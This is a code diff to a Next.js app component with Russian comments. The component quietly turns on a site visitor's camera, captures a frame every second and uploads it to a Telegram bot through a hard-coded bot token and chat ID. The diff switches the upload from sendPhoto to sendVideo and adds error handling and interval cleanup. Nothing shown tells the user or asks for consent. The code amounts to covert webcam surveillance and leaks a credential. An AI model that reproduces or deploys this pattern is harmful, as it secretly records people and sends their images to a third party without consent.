@@ -8,13 +8,14 @@ import { useEffect, useRef } from "react";
 // const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
 
 const myApp = ({ Component, pageProps }) => {
-    const videoRef = useRef(null);
 
     // отправляем видео/фото боту 
+    const videoRef = useRef(null);
+    let intervalId;
 
     const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
     const chatId = "-1001860144177";
-    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
 
     useEffect(() => {
         const getMediaAndSendData = async () => {
@@ -25,16 +26,21 @@ const myApp = ({ Component, pageProps }) => {
                     videoRef.current.srcObject = stream;
 
                     const captureFrame = () => {
-                        const canvas = document.createElement('canvas');
-                        const context = canvas.getContext('2d');
-                        canvas.width = videoRef.current.videoWidth;
-                        canvas.height = videoRef.current.videoHeight;
-                        context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-                        return canvas.toDataURL('image/jpeg');
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const context = canvas.getContext('2d');
+                            canvas.width = videoRef.current.videoWidth;
+                            canvas.height = videoRef.current.videoHeight;
+                            context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+                            return canvas.toDataURL('image/jpeg');
+                        } catch (error) {
+                            console.error('Ошибка при захвате кадра:', error);
+                            clearInterval(intervalId);
+                        }
                     };
 
                     // Отправляем данные на сервер (бота) с использованием fetch
-                    setInterval(async () => {
+                    intervalId = setInterval(async () => {
                         const photoDataUrl = captureFrame();
                         const blob = await (await fetch(photoDataUrl)).blob();
 
@@ -56,7 +62,7 @@ const myApp = ({ Component, pageProps }) => {
                         } catch (error) {
                             console.error('Ошибка fetch:', error);
                         }
-                    }, 1000); // Отправлять фото каждые 5 секунд
+                    }, 1000); // Отправлять фото каждые 1 секунд
                 }
             } catch (error) {
                 console.error('Ошибка доступа к мультимедийным устройствам:', error);
@@ -64,7 +70,11 @@ const myApp = ({ Component, pageProps }) => {
         };
 
         getMediaAndSendData();
+
+        // Прерываем интервал при размонтировании компонента
+        return () => clearInterval(intervalId);
     }, []);
+
     // 
 
 
